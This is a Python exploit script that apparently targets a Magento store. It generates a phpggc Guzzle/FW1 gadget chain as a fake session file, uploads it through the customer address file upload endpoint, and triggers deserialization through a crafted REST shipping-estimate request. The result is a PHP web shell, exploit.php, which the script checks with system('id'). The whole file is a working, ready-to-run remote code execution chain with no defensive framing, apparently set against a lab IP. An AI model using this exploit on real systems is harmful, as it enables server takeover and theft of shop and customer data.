#!/usr/bin/env python3
import os
import random
import string
import subprocess
import requests
import json


def generate_random_string(length, chars=None):
    if chars is None:
        chars = string.ascii_letters + string.digits
    return "".join(random.choice(chars) for _ in range(length))


def main():
    HOST = "http://10.253.253.2:80"
    PAYLOAD_IN = "shell.php"
    PAYLOAD_OUT = "pub/exploit.php"

    FORMKEY = generate_random_string(16)
    SESSID = generate_random_string(26, string.ascii_lowercase + string.digits)

    print(f"[*] Generated FORMKEY: {FORMKEY}")
    print(f"[*] Generated SESSID: {SESSID}")

    try:
        print("[*] Executing phpggc command...")
        subprocess.run(["php", "./phpggc/phpggc", "-se", "Guzzle/FW1", PAYLOAD_OUT, PAYLOAD_IN, "-o", "session"], check=True)
        print("[+] phpggc command executed successfully")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error executing phpggc: {e}")
        return
    except FileNotFoundError:
        print("[-] phpggc not found. Please ensure it's in the current directory")
        return

    try:
        print("[*] Sending file upload request...")
        session_file = f"session"

        files = {
            "form_key": (None, FORMKEY),
            "custom_attributes[country_id]": (f"sess_{SESSID}", open(session_file, "rb"), "application/octet-stream"),
        }

        cookies = {"form_key": FORMKEY}

        response = requests.post(f"{HOST}/customer/address_file/upload", files=files, cookies=cookies, verify=False)

        print(f"[+] File upload response status: {response.status_code}")

    except Exception as e:
        print(f"[-] Error in file upload request: {e}")
        return

    try:
        print("[*] Sending REST API request...")

        headers = {"Accept": "application/json", "Content-Type": "application/json"}

        cookies = {"PHPSESSID": SESSID}

        print(f"[*] Using PHPSESSID cookie: {SESSID}")

        payload = {
            "address": {
                "directoryData": {
                    "context": {"urlDecoder": {"urlBuilder": {"session": {"sessionConfig": {"savePath": "media/customer_address/s/e"}}}}}
                }
            }
        }

        response = requests.post(
            f"{HOST}/rest/all/V1/guest-carts/123/estimate-shipping-methods",
            headers=headers,
            cookies=cookies,
            data=json.dumps(payload),
            verify=False,
        )

        print(f"[+] REST API response status: {response.status_code}")
        if response.text:
            print(f"[+] Response: {response.text}")

    except Exception as e:
        print(f"[-] Error in REST API request: {e}")
        return

    try:
        print("[*] Verifying exploit success...")

        params = {"1": 'system("id");'}

        response = requests.get(f"{HOST}/exploit.php", params=params, verify=False)

        if response.status_code == 200 and "www-data" in response.text:
            print(response.text)
            print("[+] Exploit successful! Access the web shell at:")
            print(f"    {HOST}/exploit.php?1=system('id');")
        else:
            print("[-] Exploit may have failed. Could not access the web shell.")
    except Exception as e:
        print(f"[-] Error verifying exploit: {e}")
        return

    print("[+] Exploit completed")


if __name__ == "__main__":
    main()
